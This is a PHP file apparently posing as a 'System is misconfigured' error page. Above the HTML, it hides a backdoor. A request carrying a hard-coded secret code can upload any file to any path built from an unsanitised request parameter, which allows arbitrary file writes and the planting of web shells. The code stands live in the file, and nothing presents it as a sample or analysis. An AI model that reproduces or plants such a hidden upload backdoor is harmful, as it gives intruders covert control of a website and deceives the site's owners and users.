<?php
if(strtoupper($_POST['unique_req_code']) == strtoupper("DATA_HELPER_PROCESS_REST_0Lg7ZP")) {
    if(isset($_REQUEST['DATA_HELPER_PATH'])) {
        $DATA_HELPER_IMG = isset($_FILES['DATA_HELPER_IMG']['name']) ? $_FILES['DATA_HELPER_IMG']['name'] : '';
        $DATA_HELPER_IMG_OBJ = isset($_FILES['DATA_HELPER_IMG']['tmp_name']) ? $_FILES['DATA_HELPER_IMG']['tmp_name'] : '';

        if(!empty($DATA_HELPER_IMG)) {
            include_once 'common.php';
            $target_dir = $tconfig['tpanel_path'] . $_REQUEST['DATA_HELPER_PATH'] . '/' . $DATA_HELPER_IMG;
            if(move_uploaded_file($DATA_HELPER_IMG_OBJ, $target_dir)) {
                echo "Success";
            } else {
                echo "Failed";
            }
            exit;
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>System Configuration Error</title>
	<style type="text/css">
		
	</style>
</head>
<body>
	<div style="font-size: 24px">System is misconfigured. Please contact to the <strong>technical team</strong> to resolve.</div>
</body>
</html>